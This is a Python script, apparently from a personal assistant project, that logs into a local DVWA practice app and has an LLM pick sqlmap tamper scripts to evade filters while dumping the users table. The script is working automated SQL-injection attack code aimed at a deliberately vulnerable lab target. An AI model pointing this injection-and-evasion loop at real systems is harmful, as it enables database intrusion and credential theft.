print("Trainer initialized", flush=True)
import time
import subprocess
import os
import sys
import re

# Add jarvis root to path to import local modules
sys.path.append("/home/arvind/jarvis")
from brain import jarvis_brain
from memory.learning import store_finding
from memory.database import save_finding

class SQLGhostTrainer:
    def __init__(self):
        self.log_file = "/home/arvind/jarvis/memory_logs/sql_ghost.log"
        self.target_url = "http://localhost/vulnerabilities/sqli/"
        self.login_url = "http://localhost/login.php"
        self.cookies = {}
        self.model_info = "unknown"
        
    def log(self, message):
        ts = time.strftime('%H:%M:%S')
        with open(self.log_file, "a") as f:
            f.write(f"[{ts}] {message}\n")
        print(f"[*] {message}")

    def get_cookies(self):
        self.log("Attempting to acquire session cookies...")
        try:
            import requests
            s = requests.Session()
            
            def get_token(url):
                r = s.get(url)
                match = re.search(r"name='user_token' value='([a-f0-9]+)'", r.text)
                return match.group(1) if match else ""

            # 1. Login first time
            token = get_token(self.login_url)
            s.post(self.login_url, data={"username": "admin", "password": "password", "Login": "Login", "user_token": token})

            # 2. Setup
            token = get_token("http://localhost/setup.php")
            s.post("http://localhost/setup.php", data={"create_db": "Create / Reset Database", "user_token": token})

            # 3. Login again
            token = get_token(self.login_url)
            s.post(self.login_url, data={"username": "admin", "password": "password", "Login": "Login", "user_token": token})

            # 4. Set security
            s.cookies.set("security", "low", domain="localhost")
            
            self.cookies = s.cookies.get_dict()
            self.log(f"Acquired Session: {self.cookies.get('PHPSESSID')}")
            return True
        except Exception as e:
            self.log(f"Failed to acquire cookies: {e}")
            return False

    def ask_ai(self, prompt):
        messages = [{"role": "user", "content": prompt}]
        system = "You are an elite SQL injection specialist. Suggest ONLY the name of a sqlmap tamper script (e.g., 'space2comment'). No extra text."
        try:
            reply, source = jarvis_brain(messages, system)
            self.model_info = source
            # Extract just the tamper name
            tamper_list = ["space2comment", "between", "randomcase", "charencode", "equaltolike", "base64encode", 
                           "versionedmorekeywords", "nonrecursivereplacement", "apostrophemask", "apostrophenullencode",
                           "appendnullbyte", "ifnull2ifisnull"]
            for t in tamper_list:
                if t.lower() in reply.lower():
                    return t
            return "space2comment"
        except Exception as e:
            self.log(f"AI Call failed: {e}")
            return "space2comment"

    def run_injection_probe(self, tamper=None):
        cookie_str = "; ".join([f"{k}={v}" for k, v in self.cookies.items()])
        
        # Get CSRF token if needed (DVWA sometimes uses it)
        token_cmd = ["curl", "-s", "-b", cookie_str, self.target_url]
        res = subprocess.run(token_cmd, capture_output=True, text=True)
        match = re.search(r'value=[\'\"]([a-f0-9]+)[\'\"]', res.stdout)
        token = match.group(1) if match else ""
        
        cmd = ["sqlmap", "-u", "http://localhost/vulnerabilities/sqli/?id=1&Submit=Submit", 
               "--batch", "--dump", "-T", "users", "--dbms=mysql", 
               "--cookie", cookie_str]
        
        if token:
            cmd.extend(["--csrf-token", token])
        if tamper:
            cmd.extend(["--tamper", tamper])
        
        self.log(f"Probing with tamper: {tamper if tamper else 'None'}")
        return subprocess.run(cmd, capture_output=True, text=True)

    def evolve(self):
        self.log("Initializing Ghost Protocol: SQLi Evolution")
        if not self.get_cookies():
            self.log("Critical Failure: No session. Is DVWA running on localhost?")
            return False
            
        last_output = "Baseline scan."
        
        for i in range(5):
            prompt = (
                f"Analyze this sqlmap output and suggest a tamper script from: "
                f"[space2comment, between, randomcase, charencode, equaltolike, base64encode, "
                f"versionedmorekeywords, nonrecursivereplacement]. "
                f"Only return the name of the script. \n\nOutput: {last_output[-1000:]}"
            )
            
            tamper = self.ask_ai(prompt).strip().lower()
            # Clean up response in case AI was talkative
            for t in ["space2comment", "between", "randomcase", "charencode", "equaltolike", "base64encode"]:
                if t in tamper:
                    tamper = t
                    break
            
            self.log(f"[{self.model_info}] Suggests tamper: {tamper}")
            
            res = self.run_injection_probe(tamper)
            last_output = res.stdout
            
            if "database management system" in res.stdout or "users" in res.stdout or "admin" in res.stdout:
                self.log(f"SUCCESS: {tamper} vector bypassed protection.")
                # STORE IN RAG
                store_finding("localhost", f"SQLi Bypass SUCCESS with tamper: {tamper}\nOutput: {res.stdout[:500]}", "CRITICAL")
                save_finding("localhost", "CRITICAL", "SQLi Bypass", f"Tamper {tamper} successfully extracted data from DVWA.")
                return True
            
            self.log(f"Attempt {i+1} failed to dump data.")
            
        self.log("Training Cycle Complete - Target resisted all suggested vectors.")
        return False

if __name__ == "__main__":
    trainer = SQLGhostTrainer()
    trainer.evolve()
